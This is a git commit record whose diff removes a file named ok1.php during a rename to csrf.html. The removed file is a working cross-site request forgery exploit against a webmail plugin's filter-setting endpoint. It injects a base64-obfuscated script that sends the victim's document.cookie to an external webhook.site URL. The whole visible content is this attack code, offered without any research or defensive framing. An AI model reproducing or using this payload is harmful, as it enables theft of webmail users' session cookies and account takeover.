65f724dfd815a5c1c164fb2c092608f8d9a44290
NGUYỄN THÀNH ĐẠT <ntdat23121999@gmail.com>
2025-05-26 17:30:41 +0700

    Update and rename ok1.php to csrf.html

--- ok1.php
+++
@@ -1,6 +0,0 @@
-<script>
-fetch("https://target-site.com/webmail/?_task=mail&_action=plugin.thunderbird_labels.set_filters&_mbox=INBOX&_filters=%3Cscript%3Eeval%28atob%28%22ZmV0Y2goJ2h0dHBzOi8vd2ViaG9vay5zaXRlLzNkZWM5Zjk1LWJhMjUtNGZjOC05YjBkLWJmNjI5YWU2YWFkNj9xPScgKyAoZG9jdW1lbnQuY29va2llKSk%3D%22%29%29%3C%2Fscript%3E%3A0%7CPersonal%3A0%7CTo%20do%3A0%7CLater%3A0&_remote=1", {
-    method: "GET",
-    credentials: "include"
-});
-</script>
